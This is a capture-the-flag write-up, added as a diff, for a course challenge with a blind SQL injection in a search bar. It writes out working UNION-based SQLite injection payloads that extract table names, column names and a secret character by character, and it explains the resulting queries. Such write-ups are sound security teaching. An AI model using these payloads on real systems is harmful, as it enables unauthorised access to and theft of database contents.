@@ -1,0 +1,18 @@
+# Challenge `Sometimes we are just temporarily blind` writeup
+
+- Vulnerability: SQL Injection
+- Where: `http://mustard.stt.rnl.tecnico.ulisboa.pt:22262` search bar
+- Impact: Allows an attacker to perform queries and access information in the database
+- NOTE: Even though the website does not show the blogposts anymore, we can still take advantage of the fact that it shows how many results were found for the query
+
+## Steps to reproduce
+
+1. Find the names of the tables in the database by searching for `' UNION SELECT null, substr(name, 0, len(<guess>) + 1) as n, null FROM sqlite_master WHERE type = 'table' and n = '<guess>';--`, trying to guess it character by character: if it found more than 4 articles (it will always find at least 4 articles corresponding to the blogposts in the 'blog_post' table) it means that you correctly guessed the current character, so you add the `<guess>` to the queue to try to find the next character. Repeat this process until the queue is empty and you find all the names of the tables in the database
+2. Using this method you find 3 tables named: 'user', 'blog_post' and 'super_s_sof_secrets'
+3. Repeat the same method described in step 1, but this time search for `' UNION SELECT null, substr(name, 0, len(<guess>) + 1) as n, null FROM pragma_table_info('super_s_sof_secrets') WHERE n = '<guess>';--` to find the names of the columns in the 'super_s_sof_secrets' table
+4. Using this method you find 2 columns named: 'id' and 'secret'
+5. Repeat the same method described in step 1, but this time search for `' UNION SELECT null, substr(secret, 0, len(<guess>) + 1) as s, null FROM super_s_sof_secrets WHERE s = '<guess>';--` to find the flag in the column 'secret' of the table 'super_s_sof_secrets'
+
+__Note: If you try to search for  `'a`, you will be redirected to an error page where you can see the structure of the query: `SELECT id, title, content FROM blog_post WHERE title LIKE '%<your_search>%' OR content LIKE '%<your_search>%'`. Since the `--` symbol represents the start of a comment in SQLite, the rest of the query will be ignored, so if you search for `' UNION SELECT null, substr(name, 0, len(<guess>) + 1) as n, null FROM sqlite_master WHERE type = 'table' and n = '<guess>';--`, the performed query will be `SELECT id, title, content FROM blog_post WHERE title LIKE '%' UNION SELECT null, substr(name, 0, len(<guess>) + 1) as n, null FROM sqlite_master WHERE type = 'table' and n = '<guess>';--`, returning all the blogposts in the 'blog_post' table and the names of the tables in the database that start with `<guess>`; if you search for `' UNION SELECT null, substr(name, 0, len(<guess>) + 1) as n, null FROM pragma_table_info('super_s_sof_secrets') WHERE n = '<guess>';--`, the performed query will be `SELECT id, title, content FROM blog_post WHERE title LIKE '%' UNION SELECT null, substr(name, 0, len(<guess>) + 1) as n, null FROM pragma_table_info('super_s_sof_secrets') WHERE n = '<guess>';--`, returning all the blogposts in the 'blog_post' table and the names of the columns in the 'super_s_sof_secrets' table that start with `<guess>`; and if you search for `' UNION SELECT null, substr(secret, 0, len(<guess>) + 1) as s, null FROM super_s_sof_secrets WHERE s = '<guess>';--`, the performed query will be `SELECT id, title, content FROM blog_post WHERE title LIKE '%' UNION SELECT null, substr(secret, 0, len(<guess>) + 1) as s, null FROM super_s_sof_secrets WHERE s = '<guess>';--`, returning all the blogposts in the 'blog_post' table and the entries of the column 'secret' in the 'super_s_sof_secrets' table that start with `<guess>`__
+
+[(POC)](pocs/sometimes_we_are_just_temporarily_blind_poc.py)
